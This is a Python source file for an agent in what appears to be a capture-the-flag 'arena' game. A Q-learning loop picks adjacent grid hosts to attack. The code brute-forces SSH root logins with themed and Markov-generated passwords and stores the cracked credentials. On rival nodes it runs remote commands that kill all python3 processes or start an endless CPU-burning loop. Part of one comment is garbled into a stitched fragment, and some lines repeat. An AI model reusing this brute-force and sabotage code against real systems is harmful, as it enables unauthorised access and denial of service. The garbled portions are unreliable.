
import os
import sys
import time
import random
import json
import socket
import subprocess
import urllib.request
import threading
from concurrent.futures import ThreadPoolExecutor

# --- CONFIG ---
ORCHESTRATOR = "http://arena_orchestrator:5000"
ME = os.environ.get("GLADIATOR_ID", "Spartacus")
ME = os.environ.get("GLADIATOR_ID", "Spartacus")
Q_FILE = "/gladiator/data/q_table.json"

def post_json(url, data=None):
    try:
        if data:
            json_data = json.dumps(data).encode('utf-8')
            req = urllib.request.Request(url, data=json_data, headers={'Content-Type': 'application/json'})
        else:
            req = urllib.request.Request(url, method='POST')
        
        with urllib.request.urlopen(req, timeout=5) as response:
            if response.status == 200:
                print(f"[{ME}] POST Success to {url}")
                return json.loads(response.read().decode())
            print(f"[{ME}] POST Failed to {url}: Status {response.status}")
            return None
    except urllib.error.HTTPError as e:
        err_body = e.read().decode()
        print(f"[{ME}] Request failed to {url}: Status {e.code} Body: {err_body}")
        return None
    except Exception as e:
        print(f"[{ME}] Request failed to {url}: {e}")
        return None


# --- Q-LEARNING BRAIN ---
class Brain:
    def __init__(self, team_id='RED'):
        self.q_table = {} # Key: State, Value: {Action: Value}
        self.alpha = 0.1  # Learning Rate
        self.gamma = 0.9  # Discount Factor
        self.epsilon = 0.2 # Exploration Rate
        self.team_id = team_id
        self.q_file = f"/gladiator/data/q_table_{team_id}.json"
        self.load()

    def load(self):
        if os.path.exists(self.q_file):
            try:
                with open(self.q_file, 'r') as f:
                    self.q_table = json.load(f)
            except: pass

    def save(self):
        try:
            with open(self.q_file, 'w') as f:
                json.dump(self.q_table, f)
        except: pass

    def get_state(self, targets):
        # State = (Num_Targets, Nearest_Dist)
        # Simplified abstraction
        count = len(targets)
        min_dist = 99
        if count > 0:
            min_dist = min([t['dist'] for t in targets])
        return f"{count}_{min_dist}"

    def choose_action(self, state, available_actions):
        if random.random() < self.epsilon:
            return random.choice(available_actions)
        
        if state not in self.q_table or not self.q_table[state]:
            self.q_table[state] = {a: 0.0 for a in available_actions}
            
        # Argmax
        state_actions = self.q_table[state]
        return max(state_actions, key=state_actions.get)

    def learn(self, state, action, reward, next_state):
        if state not in self.q_table:
            self.q_table[state] = {}
        if next_state not in self.q_table:
            self.q_table[next_state] = {}
            
        old_value = self.q_table[state].get(action, 0.0)
        next_max = 0.0
        if self.q_table[next_state]:
            next_max = max(self.q_table[next_state].values())

        new_value = old_value + self.alpha * (reward + self.gamma * next_max - old_value)
        self.q_table[state][action] = new_value
        self.save()

# --- UTILS ---
def log(msg):
    # Local print
    print(f"[{ME}] {msg}")
    sys.stdout.flush()
    # Remote push
    try:
        post_json(f"{ORCHESTRATOR}/api/log", {"gladiator_id": ME, "message": msg})
    except: pass

def get_grid_state():
    try:
        with urllib.request.urlopen(f"{ORCHESTRATOR}/api/grid", timeout=2) as response:
            if response.status == 200:
                return json.loads(response.read().decode())
    except: pass
    return {}

def is_occupied(target_ip):
    # Map IP to Grid Key
    # IP: 172.20.y.(10+x)
    try:
        parts = target_ip.split('.')
        y = int(parts[2])
        x = int(parts[3]) - 10
        key = f"{x},{y}"
        
        state = get_grid_state()
        if state and "grid" in state:
            node = state["grid"].get(key)
            if node and node.get("gladiator"):
                return True
    except: pass
    return False

def register():
    log("Registering with Orchestrator...")
    # Send actual IP because remote_addr might be the gateway in Docker-on-WSL
    my_ip = get_base_ip()
    data = post_json(f"{ORCHESTRATOR}/api/register", {"gladiator_id": ME, "ip": my_ip})
    if data:
        log(f"Registered! Class: {data.get('weight_class')}")

        return True
    return False

def claim_node(target_ip):
    global current_ip
    log(f"🏳️ Claiming {target_ip}...")
    
    # CRITICAL: Save memory BEFORE calling backend.
    # The backend copies our files *during* the request.
    # If we save after, the new node gets stale memory!
    visited.add(current_ip) # Mark current
    visited.add(target_ip) # Mark target (optimistic)
    save_memory()
    
    data = post_json(f"{ORCHESTRATOR}/api/claim", {"gladiator_id": ME, "target_ip": target_ip})
    if data and "error" not in data:
        log(f"✅ MOVED to {target_ip}. Shutting down local process.")
        sys.exit(0) # Die so the new one can live
    
    # If failed, maybe remove from visited? 
    # Eh, safer to keep it visited so we don't loop on a failing node.
    log(f"❌ Claim Failed: {data}")
    return False

# --- ACTIONS ---
# Removed: MarkovCracker (obsolete)
import paramiko

def attempt_login(password, ip):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username='root', password=password, timeout=2, banner_timeout=5)
        ssh.close()
        return True
    except: return False

def crash_node(target_ip, password):
    log(f"💥 ATTACKING {target_ip}...")
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username='root', password=password, timeout=5)
        ssh.exec_command("nohup pkill -9 python3 &")
        ssh.close()
        log(f"💀 CRASHED {target_ip}!!")
        return True
    except Exception as e:
        log(f"❌ Crash Failed: {e}")
        return False

def slow_node(target_ip, password):
    log(f"💣 LOGIC BOMBING {target_ip}...")
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, username='root', password=password, timeout=5)
        # CPU BURNER: Forever loop with math
        ssh.exec_command("nohup python3 -c \"while True: _=2**10000\" > /dev/null 2>&1 &")
        ssh.close()
        log(f"🐢 SLOWED DOWN {target_ip}!!")
        return True
    except Exception as e:
        log(f"❌ Bomb Failed: {e}")
        return False






def get_base_ip():
    # Hacky way to get own IP
    hostname = socket.gethostname()
    return socket.gethostbyname(hostname)

# --- STATE ---
current_ip = None
visited = set()
has_key = False
MEMORY_FILE = "memory.json"

# AI Hacking Brain: Weights for themes/patterns
hacking_brain = {
    "themes": {
        "admin_root": 1.0, # THEME_0
        "rpg": 1.0,        # THEME_1
        "arena": 1.0,      # THEME_2
        "mixed": 1.0       # THEME_3
    },
    "mutations": {
        "raw": 1.0,
        "digit_1": 1.0,
        "digit_2": 1.0
    },
    "known_passwords": {}, # IP -> Password mapping (Literal Memory)
    "vulnerability_map": {}, # IP -> List of discovered vulnerabilities
    "pattern_knowledge": {} # Grid pattern -> List of vulnerabilities
}

THEMES = {
    "admin_root": ["admin", "root", "password"],
    "rpg": ["dragon", "shadow", "master"],
    "arena": ["spartacus", "gladiator", "battle", "arena"],
    "mixed": ["qwerty", "123456", "security"]
}

import base64

def scramble(data_str):
    # Team-based XOR Scrambling (The Shield)
    key = TEAM
    scrambled = "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data_str)])
    return base64.b64encode(scrambled.encode()).decode()

def unscramble(scrambled_b64):
    try:
        key = TEAM
        decoded = base64.b64decode(scrambled_b64).decode()
        unscrambled = "".join([chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(decoded)])
        return unscrambled
    except:
        log("🛡️ SECURITY ALERT: Memory decryption failed! Rival data or corruption detected.")
        return None

def load_memory():
    global visited, has_key, TEAM, hacking_brain
    if os.path.exists(MEMORY_FILE):
        try:
            with open(MEMORY_FILE, 'r') as f:
                raw_data = f.read().strip()
                
                # Try unscrambling first
                un_json = unscramble(raw_data)
                if un_json:
                    data = json.loads(un_json)
                else:
                    # Fallback for old/unencrypted files
                    data = json.loads(raw_data)
                
                visited = set(data.get('visited', []))
                has_key = data.get('has_key', False)
                
                # Load hacking_brain with new fields
                loaded_brain = data.get('hacking_brain', {})
                hacking_brain['themes'] = loaded_brain.get('themes', hacking_brain['themes'])
                hacking_brain['mutations'] = loaded_brain.get('mutations', hacking_brain['mutations'])
                hacking_brain['known_passwords'] = loaded_brain.get('known_passwords', {})
                hacking_brain['vulnerability_map'] = loaded_brain.get('vulnerability_map', {})
                hacking_brain['pattern_knowledge'] = loaded_brain.get('pattern_knowledge', {})
                
                if 'team' in data:
                    TEAM = data['team']
                
                log(f"🧠 Memory Decrypted & Loaded. Vulns known: {len(hacking_brain['vulnerability_map'])}")
        except Exception as e:
            log(f"⚠️ Memory Load Error: {e}")

def save_memory():
    with open(MEMORY_FILE, 'w') as f:
        data_json = json.dumps({
            "visited": list(visited), 
            "has_key": has_key, 
            "team": TEAM,
            "hacking_brain": hacking_brain
        })
        # Scramble before saving
        f.write(scramble(data_json))

def check_for_key():
    global has_key, visited
    # Check if we are standing on the key
    if os.path.exists("/gladiator/THE_KEY.txt"):
        if not has_key:
            log("💎 FOUND THE KEY!! PICKING IT UP!")
            has_key = True
            # Clear visited so we can backtrack home
            visited = set()
            save_memory()
    
    # Check Win Condition
    my_x, my_y = get_my_coords()
    
    win = False
    if has_key:
        if TEAM == 'RED' and my_x == 0 and my_y == 0: win = True
        if TEAM == 'BLUE' and my_x == 5 and my_y == 5: win = True
        
    if win:
        log(f"🏆 {TEAM} TEAM VICTORY! KEY DELIVERED TO BASE!")
        # We could notify orchestrator or just spam logs
        while True:
            log(f"🏆 {TEAM} WINS 🏆")
            time.sleep(10)

def get_my_coords():
    global current_ip
    if not current_ip:
        current_ip = get_base_ip() # Init
    
    try:
        parts = current_ip.split('.')
        y = int(parts[2])
        x = int(parts[3]) - 10
        return x, y
    except:
        return 0, 0

def scan_network():
    # Return list of {ip, dist}
    my_x, my_y = get_my_coords() # Use Logical Coords
    targets = []
    
    # Determine Goal based on Team/Key
    goal_x, goal_y = 3, 3 # Default Key Location (Center-ish for 6x6)
    
    state = get_grid_state()
    if state and "key_location" in state:
        try:
            kparts = state["key_location"].split(',')
            goal_x, goal_y = int(kparts[0]), int(kparts[1])
        except: pass
        
    if has_key:
        if TEAM == 'RED':
            goal_x, goal_y = 0, 0 # Red Base
        else:
            goal_x, goal_y = 5, 5 # Blue Base
        log(f"🚩 RETURNING TO {TEAM} BASE ({goal_x},{goal_y})")
    else:
        # log(f"🔎 SEEKING KEY AT ({goal_x},{goal_y})")
        pass

    GRID_SIZE = int(os.environ.get("GRID_SIZE", 6))
    for y in range(GRID_SIZE):
        for x in range(GRID_SIZE):
            target_ip = f"172.20.{y}.{10+x}"
             # Don't target self (Logical Self)
            if x == my_x and y == my_y:
                continue
            
            # Don't target visited nodes (unless we have no choice? For now, strict filter)
            if target_ip in visited:
                continue
            
            # Team Logic: Don't attack teammates (if any)
            # For 1v1, this is irrelevant, but good practice.
            # We assume anyone else is an enemy.

            # Calc Manhattan Distance to ME (Reachability)
            dist = abs(my_x - x) + abs(my_y - y)
            
            # Calc Distance to GOAL (Heuristic)
            dist_to_goal = abs(goal_x - x) + abs(goal_y - y)
            
            # Strict Filter: Only consider adjacent neighbors (Dist 1) for movement
            if dist == 1:
                # Store dist_to_goal for sorting
                targets.append({'ip': target_ip, 'dist': dist, 'score': dist_to_goal})
    
    # BACKTRACKING LOGIC:
    # If filtered list is empty (all neighbors visited), we must allow visited nodes.
    if not targets:
        log("⚠️ NO NEW TARGETS! Backtracking enabled.")
        for y in range(GRID_SIZE):
            for x in range(GRID_SIZE):
                target_ip = f"172.20.{y}.{10+x}"
                if x == my_x and y == my_y: continue
                
                # Check occupancy (don't backtrack into an enemy unless we want to fight?)
                # For now, allow it.
                
                dist = abs(my_x - x) + abs(my_y - y)
                dist_to_goal = abs(goal_x - x) + abs(goal_y - y)
                
                if dist == 1:
                     targets.append({'ip': target_ip, 'dist': dist, 'score': dist_to_goal})

    # Sort targets by Proximity to Goal (Lowest Score first)
    targets.sort(key=lambda t: t['score'])
                
    return targets


# --- TOOLS ---
class MarkovCracker:
    def __init__(self):
        self.chain = {}
        self.terminals = {}
        self.terminals = {}
        PWD_LIST = "/gladiator/passwords.txt"
        self.ensure_password_file(PWD_LIST)
        self.train_on_file(PWD_LIST) # Default seed
        
    def ensure_password_file(self, filepath):
        if not os.path.exists(filepath):
            # Seed with common passwords if file is missing
            defaults = ["123456", "12345678", "password", "admin", "admin123", "root", "toor", "qwerty", "dragon", "baseball"]
            try:
                with open(filepath, "w") as f:
                    f.write("\n".join(defaults))
            except: pass

        
    def train_on_file(self, filepath):
        if not os.path.exists(filepath): return
        with open(filepath, 'r') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    self.train(line.strip())
                
    def train(self, password):
        # Trigrams for better structure
        keys = ['^'] + list(password) + ['$']
        for i in range(len(keys) - 1):
            char = keys[i]
            next_char = keys[i+1]
            if char not in self.chain: self.chain[char] = []
            self.chain[char].append(next_char)

    def generate(self, length=3):
        if not self.chain: 
            # Fallback to random alphanumeric 5-char if chain is empty
            alphabet = "0123456789"
            return "".join(random.choice(alphabet) for _ in range(length))
            
        pwd = ""
        char = '^'
        retries = 0
        while len(pwd) < length and retries < 100:
            retries += 1
            if char not in self.chain: 
                pwd += random.choice("0123456789")
                char = pwd[-1]
                continue
            next_char = random.choice(self.chain[char])
            if next_char == '$': 
                if len(pwd) < length: # Too short, retry
                    char = '^'
                    pwd = ""
                    continue
                else: break
            pwd += next_char
            char = next_char
        
        # Final fallback if still too short
        while len(pwd) < length:
            pwd += random.choice("0123456789")
            
        return pwd[:length]

# --- ACTIONS ---
def learn_from_hack(password, target_ip):
    global hacking_brain
    # 1. Literal Memory: Store for instant re-entry
    hacking_brain["known_passwords"][target_ip] = password
    log(f"🧠 Memory Saved: {target_ip} -> {password}")
    
    # 2. Generalization: Learn themes/patterns
    found_theme = None
    for theme, words in THEMES.items():
        for word in words:
            if password.startswith(word):
                found_theme = theme
                break
        if found_theme: break
    
    found_mutation = "raw"
    if found_theme:
        suffix = password[len(next(w for w in THEMES[found_theme] if password.startswith(w))):]
        if len(suffix) == 1: found_mutation = "digit_1"
        elif len(suffix) == 2: found_mutation = "digit_2"
    
    # Boost weights
    if found_theme:
        hacking_brain["themes"][found_theme] += 2.0
        log(f"🧠 Learned: Theme '{found_theme}' is active. Boosting weight.")
    
    hacking_brain["mutations"][found_mutation] += 1.0
    log(f"🧠 Learned: Mutation '{found_mutation}' is active. Boosting weight.")
    save_memory()

def calculate_min_corner_distance(x, y):
    """Calculate Manhattan distance to nearest corner"""
    dist_00 = x + y
    dist_05 = x + (5 - y)
    dist_50 = (5 - x) + y
    dist_55 = (5 - x) + (5 - y)
    return min(dist_00, dist_05, dist_50, dist_55)

def learn_vulnerability_pattern(x, y, discovered_vulns):
    """Learn which vulnerabilities appear at which grid locations"""
    global hacking_brain
    
    min_dist = calculate_min_corner_distance(x, y)
    
    # Categorize by distance tier
    if min_dist == 0:
        pattern_key = "corners"
    elif min_dist <= 2:
        pattern_key = "edges"
    else:
        pattern_key = "center"
    
    # Store pattern
    hacking_brain["pattern_knowledge"][pattern_key] = discovered_vulns
    log(f"📊 Pattern Learned: {pattern_key} nodes have {len(discovered_vulns)} vulnerabilities")
    save_memory()

def predict_vulnerabilities(x, y):
    """Predict which vulnerabilities likely exist based on location"""
    min_dist = calculate_min_corner_distance(x, y)
    
    if min_dist == 0 and "corners" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["corners"]
    elif min_dist <= 2 and "edges" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["edges"]
    elif "center" in hacking_brain["pattern_knowledge"]:
        return hacking_brain["pattern_knowledge"]["center"]
    
    return None  # Unknown, need to probe

def background_password_guesser(target_ip, result_dict):
    """Background thread that tries passwords while web exploits run"""
    global hacking_brain
    
    # Build prioritized guess list based on Brain weights
    theme_priority = sorted(hacking_brain["themes"].items(), key=lambda x: x[1], reverse=True)
    mutation_priority = sorted(hacking_brain["mutations"].items(), key=lambda x: x[1], reverse=True)
    
    for theme_name, _ in theme_priority:
        if result_dict["found"]:
            return
        
        words = THEMES[theme_name]
        for mut_type, _ in mutation_priority:
            if result_dict["found"]:
                return
            
            guesses = []
            if mut_type == "raw":
                guesses = words
            elif mut_type == "digit_1":
                for i in range(10):
                    for w in words:
                        guesses.append(f"{w}{i}")
            elif mut_type == "digit_2":
                for i in range(100):
                    for w in words:
                        guesses.append(f"{w}{i}")
            
            for pwd in guesses:
                if result_dict["found"]:
                    return
                if attempt_login(pwd, target_ip):
                    result_dict["found"] = True
                    result_dict["password"] = pwd
                    return
                time.sleep(0.05)  # Rate limit

def action_hack(target):
    log(f"⚔️ Action: HACK {target['ip']}")
    
    # Get coordinates for learning
    try:
        parts = target['ip'].split('.')
        y = int(parts[2])
        x = int(parts[3]) - 10
    except:
        x, y = 0, 0
    
    # 0. Check Literal Memory first (Instant Win)
    if target['ip'] in hacking_brain["known_passwords"]:
        known_pwd = hacking_brain["known_passwords"][target['ip']]
        log(f"🧠 RECALL: Known password for {target['ip']} found in memory.")
        if attempt_login(known_pwd, target['ip']):
            log(f"🔓 RE-ENTRY SUCCESS: {known_pwd}")
            return known_pwd
        else:
            log(f"⚠️ RE-ENTRY FAILED: Password may have rotated. Re-learning...")
            del hacking_brain["known_passwords"][target['ip']]
    
    # 1. Determine which vulnerabilities to try
    known_vulns = None
    
    # Check if we've already discovered this node's vulnerabilities
    if target['ip'] in hacking_brain["vulnerability_map"]:
        known_vulns = hacking_brain["vulnerability_map"][target['ip']]
        log(f"📋 Known vulnerabilities for {target['ip']}: {', '.join(known_vulns)}")
    else:
        # Predict based on location pattern
        predicted_vulns = predict_vulnerabilities(x, y)
        
        if predicted_vulns is not None:
            log(f"🔮 Predicted vulnerabilities: {', '.join(predicted_vulns)}")
            known_vulns = predicted_vulns
        else:
            # Reconnaissance - discover what's available
            try:
                from exploits import reconnaissance
                log(f"🔍 Probing {target['ip']} for vulnerabilities...")
                known_vulns = reconnaissance(target['ip'])
                log(f"✅ Discovered: {', '.join(known_vulns) if known_vulns else 'None'}")
                
                # Learn the pattern
                if known_vulns:
                    learn_vulnerability_pattern(x, y, known_vulns)
            except ImportError:
                known_vulns = []  # Fallback if exploits.py not available
        
        # Save to memory
        hacking_brain["vulnerability_map"][target['ip']] = known_vulns
        save_memory()
    
    # 2. Import exploit library
    try:
        from exploits import EXPLOIT_MAP
    except ImportError:
        EXPLOIT_MAP = {}
    
    # 3. Start background password guesser
    password_result = {"found": False, "password": None}
    guesser_thread = threading.Thread(target=background_password_guesser, args=(target['ip'], password_result))
    guesser_thread.daemon = True
    guesser_thread.start()
    
    # 4. Try ONLY the known/predicted vulnerabilities
    if known_vulns and EXPLOIT_MAP:
        for vuln_name in known_vulns:
            if password_result["found"]:
                break
            
            exploit_func = EXPLOIT_MAP.get(vuln_name)
            if exploit_func:
                try:
                    password = exploit_func(target['ip'])
                    if password and attempt_login(password, target['ip']):
                        log(f"🔓 PWNED via {vuln_name}: {password}")
                        password_result["found"] = True
                        learn_from_hack(password, target['ip'])
                        return password
                except:
                    pass
    
    # 5. Wait for background guesser
    if not password_result["found"]:
        log("⏳ Web exploits failed. Waiting for password guesser...")
        guesser_thread.join(timeout=30)
    
    if password_result["found"]:
        log(f"🔓 PWNED via Brute Force: {password_result['password']}")
        learn_from_hack(password_result["password"], target['ip'])
        return password_result["password"]
    
    return None

def action_scan():
    # log("📡 Action: SCAN") # Too noisy
    return scan_network()


# --- MAIN LOOP ---
TEAM = "RED" # Default
def main():
    global TEAM, ME
    # Prioritize CLI arg, then Memory (loaded below), then Default
    if len(sys.argv) > 1:
        TEAM = sys.argv[1]
    
    # Ensure model directory exists for weigh-in
    os.makedirs("/gladiator/data/model", exist_ok=True)
    if not os.path.exists("/gladiator/data/model/dummy.bin"):
        try:
            with open("/gladiator/data/model/dummy.bin", "wb") as f:
                f.write(os.urandom(1024 * 1024 * 5)) # 5MB dummy
        except: pass

    load_memory() # Load past lives, KEY status, AND TEAM
    
    # If CLI provided, it overrides memory (Initial Launch)
    if len(sys.argv) > 1:
        TEAM = sys.argv[1]
        save_memory() # Persist it immediately
    
    # Update Gladiator ID to include team
    ME = f"Spartacus_{TEAM}"
        
    log(f"🧠 {ME} ONLINE")
    check_for_key() # Check ground immediately
    
    log("🛡️ DEFENSE SYSTEMS: ONLINE (Directional Firewall Active)")
    
    register() # Crucial: Tell the board who we are
    
    # Init visited with current loc if empty
    my_x, my_y = get_my_coords()
    start_ip = f"172.20.{my_y}.{10+my_x}"
    if start_ip not in visited:
        visited.add(start_ip)
    
    log("🧠 Initializing Brain...")
    brain = Brain(team_id=TEAM)
    log("✅ Brain initialized successfully")
    
    log("🔄 Entering main loop...")
    while True:
        # 0. Check for CTF Objectives (Key Detection & Win Condition)
        check_for_key()
        
        # 1. Observe
        log("📡 Scanning network...")
        targets = action_scan()
        log(f"Found {len(targets)} targets")
        state = brain.get_state(targets)
        
        # 2. Act
        possible_actions = ['WAIT', 'HACK_NEAREST']
        action = brain.choose_action(state, possible_actions)
        
        reward = -1 # Living cost
        
        if action == 'HACK_NEAREST' and targets:
            target = targets[0]
            password = action_hack(target)
            if password:
                reward = 50
                log("💰 REWARD: Hack Success!")
                learn_from_hack(password, target['ip'])
                
                # DECISION: CLAIM, CRASH, or SLOW?
                if is_occupied(target['ip']):
                   # 50/50 Chance to Kill or Torture
                   if random.random() > 0.5:
                       crash_node(target['ip'], password)
                   else:
                       slow_node(target['ip'], password)
                else:
                   claim_node(target['ip'])
            else:
                reward = -5
                log("❌ PENALTY: Hack Failed")
        elif action == 'WAIT':
            reward = -1
            time.sleep(1)
            
        # 3. Learn (Simplified - assuming terminal state if crash)
        # next_state = brain.get_state(action_scan())
        # brain.learn(state, action, reward, next_state)
        
        time.sleep(2) # Prevent spamming logsally move to a "next state" instantly unless we hack successfully and migrate...
        # But let's assume valid Q-Learning step
        next_targets = action_scan() # Observe result
        next_state = brain.get_state(next_targets)
        
        brain.learn(state, action, reward, next_state)

if __name__ == "__main__":
    main()
